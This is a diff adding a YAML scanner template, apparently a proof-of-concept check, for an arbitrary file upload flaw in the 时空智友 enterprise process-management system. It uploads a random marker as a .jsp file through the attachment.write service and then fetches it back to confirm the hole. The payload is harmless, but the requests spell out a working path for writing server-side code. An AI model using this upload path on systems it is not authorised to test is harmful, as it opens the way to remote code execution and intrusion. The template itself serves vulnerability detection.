@@ -1,0 +1,21 @@
+id: poc-yaml-shikongzhiyou-management-system-arbitrary-file-upload
+info:
+  name: 时空智友企业流程化管控系统-任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 时空智友
+variables:
+  v1: md5(random_str(5))
+  v2: random_str(5)
+requests:
+- method: POST
+  path: /formservice?service=attachment.write&isattach=false&filename={{.v2}}.jsp
+  data: test-{{.v1}}
+  expression: status_code == 200 && contains(body, v2)
+  output:
+  - regex_match(body,"<root>(?P<fname>.*?)</root>")
+- method: GET
+  path: /form/temp/{{.fname}}
+  expression: status_code == 200 && contains(body, v1)
+transport: http
